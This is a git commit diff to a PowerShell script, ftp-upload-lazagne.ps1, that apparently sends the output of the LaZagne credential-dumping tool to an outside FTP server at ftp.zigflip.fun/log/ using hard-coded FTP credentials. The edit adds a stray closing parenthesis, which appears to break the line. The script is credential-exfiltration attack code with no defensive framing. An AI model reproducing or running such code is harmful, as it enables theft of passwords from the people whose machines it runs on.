01c6405edc4a63d2a34f399c29a3dd90260ec99e
LittleZiG <fgtbg@yahoo.fr>
2024-01-09 16:11:34 +0100

    Update ftp-upload-lazagne.ps1

--- ftp-upload-lazagne.ps1
+++ ftp-upload-lazagne.ps1
@@ -15,7 +15,7 @@ function ftp-upload {
         $webClient = New-Object System.Net.WebClient
         $webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
         
-        $webClient.UploadFile("ftp://ftp.zigflip.fun/log/" + $outputFile, $fileContent = Get-Content -Path $fileupload -Raw -Encoding UTF8)
+        $webClient.UploadFile("ftp://ftp.zigflip.fun/log/" + $outputFile, $fileContent = Get-Content -Path $fileupload -Raw -Encoding UTF8))
 
         Write-Host "Le fichier a été uploadé avec succès."
     }
